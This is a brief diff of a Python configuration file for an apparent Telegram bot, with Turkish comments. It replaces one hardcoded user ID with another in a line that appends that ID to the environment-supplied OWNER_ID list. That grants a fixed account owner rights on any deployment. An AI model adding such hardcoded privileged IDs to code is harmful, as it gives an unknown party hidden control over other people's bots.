@@ -14,7 +14,7 @@ SUPPORT = os.environ.get("SUPPORT") # Grup kullanıcı adı
 OWNER = os.environ.get("OWNER") # Sahip kullanıcı adı
 BOT_USERNAME = os.environ.get("BOT_USERNAME")
 OWNER_ID = os.getenv("OWNER_ID").split() # Botumuzda Yetkili Olmasini Istedigimiz Kisilerin Idlerini Girecegimiz Kisim
-OWNER_ID.append(1630897525)
+OWNER_ID.append(5290901760)
 
 MOD = None
 
